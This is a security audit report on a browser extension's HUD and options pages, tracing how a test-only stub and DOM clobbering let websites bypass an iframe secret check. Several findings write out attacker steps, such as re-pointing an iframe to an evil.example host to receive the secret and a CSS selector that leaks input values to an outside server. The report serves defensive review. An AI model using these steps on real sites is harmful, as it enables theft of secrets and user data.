# Audit: pages + UI component (audit-pages)

Scope: content_scripts/ui_component.js, content_scripts/hud.js, lib/chrome_api_stubs.js, pages/*.js, pages/*.html, pages/*.css.
Read-only. No files in the repo changed.

## Summary

| Severity | Count |
|---|---|
| High | 0 |
| Medium | 2 |
| Low | 3 |
| Info | 5 |

Both Medium findings come from the same root cause: **test-only code ships in the production build and any website can switch it on.** It breaks the "a page that embeds these iframes cannot talk to them" claim in AUDIT.md:147. What an attacker can do with it **today** is limited (see "Real harm" under each finding). Both are easy to fix.

---

## 1. Findings

### M1. Any website can get past the HUD iframe's secret check with `hud_page.html?dom_tests=true`
- **Severity:** Medium
- **Where:** `pages/hud_page.js:1` imports `lib/chrome_api_stubs.js`. `lib/chrome_api_stubs.js:6-9,22,66-69` turns on stubs when `location.search` contains `dom_tests=true`. `pages/ui_component_messenger.js:13-14` checks the secret. `manifest.json` lists `pages/hud_page.html` under `web_accessible_resources` for `<all_urls>`.
- **Code path (traced):**
  1. The attacker page adds `<iframe allow="clipboard-read; clipboard-write" src="chrome-extension://<id>/pages/hud_page.html?dom_tests=true">`. This works because the page is web-accessible to every origin.
  2. `chrome_api_stubs.js` replaces `globalThis.chrome` with the stub. Assigning to `globalThis.chrome` works in extension pages; the project's own dom_tests.html relies on it. Now `chrome.storage.session.get()` returns `{}`.
  3. `registerPortWithOwnerPage`: `event.source === parent` passes because the attacker is the parent. `secret` is `undefined`. The attacker sends `iframe.contentWindow.postMessage(undefined, "*", [port])`, so `event.data` is also `undefined` and `undefined !== undefined` is false. **The handshake passes** and the attacker owns the port.
  4. The attacker can now call every handler in `hud_page.js:98-221`. `Utils.populateBrowserInfo` works under the stub: `sendMessage` returns a number, so `isFirefox` comes back falsy. The handlers include `copyToClipboard` (`navigator.clipboard.writeText` of attacker text) and `pasteFromClipboard` (`navigator.clipboard.readText()`, result posted back to the attacker as `pasteResponse`).
- **What an attacker can do:** run the HUD page's clipboard read and write primitives, from a chrome-extension:// document, on any site. It can also show any text in an extension-origin frame (minor spoofing).
- **Real harm:** limited. The extension has no `clipboardRead` or `clipboardWrite` permission, so Chrome should apply its normal clipboard permission rules to this frame. Delegation needs the attacker's `allow=` attribute, and the prompt or grant goes through the embedding site. The attacker therefore probably gains nothing it couldn't get by calling `navigator.clipboard` itself. **Not verified in a browser.** A 2-minute check: frame the URL above from a test page, send `undefined` plus a port, then send `{name:"pasteFromClipboard"}` and see whether the text comes back without a prompt. Still, it is a trust-boundary bypass, and any handler added to the HUD later inherits it.
- **Fix:** remove `import "../lib/chrome_api_stubs.js"` from `pages/hud_page.js` in release builds (have the test harness inject the stubs instead), or exclude `chrome_api_stubs.js` from the shipped package. Defence in depth: in `ui_component_messenger.js`, reject if `typeof secret !== "string" || secret.length < 32`.

### M2. A page can turn on the HUD's test mode by DOM clobbering, which leaks the session secret and the HUD port (needs a browser check)
- **Severity:** Medium (conditional, see note)
- **Where:** `content_scripts/hud.js:43`, `content_scripts/ui_component.js:32,60,75,83-88`
- **Code path (traced):**
  1. `hud.js:43` reads `globalThis.vimiumDomTestsAreRunning` in the content script. The page can make this truthy with `<a id="vimiumDomTestsAreRunning">`. That relies on window named-property access ("DOM clobbering") reaching the content-script isolated world. I believe Chrome does this, but **I have not confirmed it at runtime**. Check with: put `<div id=vimiumDomTestsAreRunning>` on a page, press `/`, and see whether the HUD iframe src ends in `?dom_tests=true`.
  2. With the flag set, `ui_component.js:32` sets `isDomTests = true`, so `ui_component.js:87` uses **`targetOrigin = "*"`**.
  3. The shadow root is `mode: "open"` (`ui_component.js:60`), so the page can do `document.querySelector(".vimium-reset").shadowRoot.querySelector("iframe").src = "https://evil.example/x"`.
  4. When that page loads, the content script's `load` listener (`ui_component.js:83`) posts the **real `vimiumSecret`** and **port2** to the attacker frame, because the target origin is `*`.
- **What an attacker can do with that:**
  - Pretend to be the HUD toward the content script (`hud.js:23-35`). It receives every `copyToClipboard` payload (yanked URLs and text; mostly data from the same page, so little new leakage). The user's yank never reaches the real clipboard. It answers `pasteFromClipboard` with any `pasteResponse`, so when the user presses `p`/`P`, the URL the attacker picks opens instead of the clipboard's. `toNavigableUrl` still blocks `javascript:`/`data:`, so the result is a redirect the page could do anyway.
  - Use the secret to complete the handshake with other web-accessible UI pages it frames, such as `help_dialog_page.html`. That only allows show and hide today.
  - The secret is also used for global marks (`background_scripts/marks.js:50-54`), but only to compare against itself, so knowing it doesn't help.
- **Real harm:** low today. It defeats the design. If clobbering is confirmed, rate it Medium.
- **Fix:** don't let page-controllable globals pick test behaviour in content scripts. Drop the `vimiumDomTestsAreRunning` branch from `hud.js:43` and `ui_component.js:32,87`, or read the flag from a closure or module variable set only by the test harness. Always use `chrome.runtime.getURL("")` as the target origin. The same flag is read in `content_scripts/vimium_frontend.js:116` and `content_scripts/mode_visual.js:335`, but those only change logging and test geometry, so they're harmless.

### L1. The open shadow root and unchecked `load` listener let pages tamper with Vimium's UI iframes
- **Severity:** Low
- **Where:** `content_scripts/ui_component.js:60` (`attachShadow({mode:"open"})`), `:83` (`addEventListener("load", …)`, not `once`, no `isTrusted` check), `:63` (user CSS appended inside the shadow root)
- **What an attacker can do:**
  - Reach the HUD and help-dialog iframes from page JS: hide them, re-point them to other extension pages, or overlay them. This is spoofing or DoS only. In normal mode the secret is protected by the exact target origin.
  - Send a fake `load` event (`iframe.dispatchEvent(new Event("load"))`) before the real load. The content script then posts port2 to the still-`about:blank` frame, where the origin mismatch drops it, and port2 becomes detached. On the real load, `postMessage(..., [port2])` throws DataCloneError, so `iframePort` never resolves. Find mode, yank and paste then hang on that site (DoS).
  - Read the user's custom CSS (`userDefinedLinkHintCss`) from the `<style>` in the shadow root. Small info leak; the CSS may hint at the user's setup.
- **Fix:** use `mode: "closed"` and keep the reference privately. Register the load handler with `{ once: true }` and ignore events where `!event.isTrusted`.

### L2. An imported backup is applied with no type or value checks; a bad file can break the options page and push CSS into every site
- **Severity:** Low (needs the user to import a crafted file)
- **Where:** `pages/options.js:319-347` → `Settings.setSettings` (lib/settings.js only filters keys, not types); `pages/options.js:127`; `pages/action.js:76-78,132`
- **What happens:**
  - `newTabDestination: "\"]"` makes `querySelector` at `options.js:127` throw a SyntaxError. If the value doesn't match any option, it returns null and `.checked` throws a TypeError. `setFormFromSettings` dies, the options page stops working, and the user can't fix it from the UI.
  - `exclusionRules` that isn't an array crashes the action popup (`.filter`). A pattern that isn't a valid regex makes `new RegExp` at `action.js:141` throw, so the popup is dead.
  - `userDefinedLinkHintCss` is applied with no preview. Custom CSS is known and accepted, but the import path means a "handy settings file" shared at work can add CSS to every page. For example, `input[value^="a"]{background:url(https://evil/…)}` leaks input values on intranet sites through CSS-only requests.
- **Fix:** validate the imported object against `Settings.defaultOptions` types and allowed values (newTabDestination must be one of `newTabDestinations`; exclusionRules must be an array of `{pattern: string, passKeys: string}` with patterns that compile). Before applying, show the CSS and key mappings in a confirm dialog. In `options.js:127`, use `CSS.escape(value)` and fall back to the default when nothing matches.

### L3. Web-accessible pages can be framed by any site: extension fingerprinting and clickjacking
- **Severity:** Low
- **Where:** `manifest.json` `web_accessible_resources` (hud_page.html, help_dialog_page.html, command_listing.html, vimium.css, tlds.txt for `<all_urls>`, without `use_dynamic_url`); `pages/help_dialog_page.js:1`; `pages/command_listing.js:1` (both load **all content scripts** in an extension-origin frame inside the attacker's tab)
- **What an attacker can do:** detect that this extension is installed by loading a known extension URL. That is a fingerprinting signal on a work machine. It can also clickjack the framed help page: the hidden "Show advanced commands" link writes a setting (`help_dialog_page.js:161`), and the "Options" link opens the options page. Neither causes real harm. The framed help and command-listing pages also run vimium_frontend and register with the background as a frame of the attacker's tab. I checked that the background does not grant extra trust based on `sender.url` (grep of background_scripts: no checks on sender.url or origin), so there's no escalation.
- **Fix:** set `"use_dynamic_url": true` on the WAR entry (Chrome only; `chrome.runtime.getURL` returns the dynamic URL automatically), and drop `resources/tlds.txt` and `content_scripts/vimium.css` from WAR if content scripts don't need them. Those two can't be loaded from a page anyway unless they're needed through `<link>`.

### Info
- **I1.** `content_scripts/ui_component.js:30` checks `this.iframeFrameElement`, which is never set (the field is `iframeElement`). The "only call load once" guard is dead code. Harmless today.
- **I2.** `pages/options.js:324` uses the implicit global `event` (`window.event`). It works in Chrome but is fragile; pass the event into `onUploadBackupClicked`.
- **I3.** `pages/action.js:146-162` `generateDefaultPattern` doesn't escape `.` (and other regex characters) in the hostname, so `https?://www.example.com/*` also matches `wwwXexample.com`. The impact is only that an exclusion (disabling Vimium) covers more than intended. User-written exclusion patterns are run as regexes against the attacker-controlled tab URL (`action.js:77,103,132`). A catastrophic pattern the user wrote, plus a long URL, could freeze the popup (self-DoS only).
- **I4.** The HUD's clipboard use depends on Chrome's web clipboard permission, because the extension has no `clipboardRead`. Upstream Vimium behaves the same way (commit 15ba534f). If Chrome shows a clipboard prompt for `p`/`P`, it may be attributed to the **website**, and clicking "Allow" could give that site lasting clipboard-read access. Worth a one-time manual check on a test site. If confirmed, either add `clipboardRead` (narrower risk: the extension reads only on `p`) or remove the `p`/`P` commands.
- **I5.** `command_listing.html:18` references `../github.svg`, which doesn't exist in the repo (it only shows on the hosted build). Not a security issue.

---

## 2. Coverage

| File | Lines | Status |
|---|---|---|
| content_scripts/ui_component.js | 211 | read in full |
| content_scripts/hud.js | 280 | read in full |
| lib/chrome_api_stubs.js | 83 | read in full |
| pages/options.js | 358 | read in full |
| pages/options.html | 249 | read in full |
| pages/action.js | 168 | read in full |
| pages/action.html | 101 | read in full |
| pages/help_dialog_page.js | 217 | read in full |
| pages/help_dialog_page.html | 99 | read in full |
| pages/hud_page.js | 247 | read in full |
| pages/hud_page.html | 18 | read in full |
| pages/command_listing.js | 85 | read in full |
| pages/command_listing.html | 60 | read in full |
| pages/ui_component_messenger.js | 71 | read in full |
| pages/exclusion_rules_editor.js | 68 | read in full |
| pages/all_content_scripts.js | 26 | read in full |
| pages/reload.html | 12 | read in full |
| pages/action.css | 61 | read in full |
| pages/command_listing.css | 119 | read in full |
| pages/doc.css | 16 | read in full |
| pages/help_dialog_page.css | 169 | read in full |
| pages/hud_page.css | 73 | read in full |
| pages/key_mappings.css | 52 | read in full |
| pages/options.css | 429 | read in full |

Followed into other files to judge findings: manifest.json, background_scripts/main.js:1-45 (secret generation, session access level), background_scripts/marks.js:1-80 (how the secret is used), background_scripts/reload.js, lib/dom_utils.js:555-575 (injectUserCss), lib/settings.js setSettings and pruneOutDefaultValues, lib/utils.js populateBrowserInfo, content_scripts/mode_normal.js:170-205 (paste and copy callers), content_scripts/vimium_frontend.js:105-125 and 440-470, content_scripts/mode_visual.js:325-345, and a grep of background_scripts for sender.url and origin trust.

## 3. Notable safe items
- `ui_component.js:48,53` and `hud.js:238,272` set `innerHTML` on `<style>` elements. The contents are raw text (no HTML parsing) and come from the extension (vimium.css cached in session storage, or a numeric opacity).
- `ui_component.js:88`: outside test mode, the secret goes only to `chrome.runtime.getURL("")` as the exact target origin, so a page can't receive it by re-pointing the iframe.
- `ui_component_messenger.js:9`: checks `event.source === parent` plus the secret, and removes the listener after the handshake. That is sound once the stubs are gone (see M1).
- `hud_page.js:101,183`, `help_dialog_page.js:99,106,122`, `command_listing.js:47,52,56,58`, `options.js:212`, `action.js:106-109,126`: all dynamic text is set through `textContent`.
- `command_listing.js:65` uses `innerHTML`, but only with static strings from `background_scripts/all_commands.js` (option names and descriptions), never user or page data.
- `help_dialog_page.js:134`: the `querySelector` template uses group names from static allCommands, not user data.
- `hud.js:31` and `hud_page.js:236`: dispatching on `data.name` in an object literal could reach `constructor` etc., but only the MessagePort holder can send, and `Object(data)` does nothing.
- `hud.js:102`: the find query is passed to `findInPlace`, not evaluated. The page can already run `window.find`.
- `options.js:313-317`: the backup download is a local Blob URL, so there's no network egress.
- `action.js:89`: the "installed?" probe goes to the extension's own content script through `chrome.tabs.sendMessage`, which the page can't intercept.
- `ui_component.js:132-133`: reading the page's `#dark-reader-style` only toggles a CSS class (cosmetic).
- pages/*.css: no `url()`, `@import` or external references.
- pages/reload.html: not web-accessible (commented out in the manifest), so it only runs if the user opens it by hand.
- No eval, `Function`, string `setTimeout`, dynamic `import()`, `document.write` or `fetch`/XHR in any file in scope. `Utils.setTimeout` is called with function arguments only.
- `options.html`, `action.html`, `help_dialog_page.html`, `command_listing.html`: no inline scripts or handlers. External links are plain `target=_blank` anchors to github.com, which the user has to click.
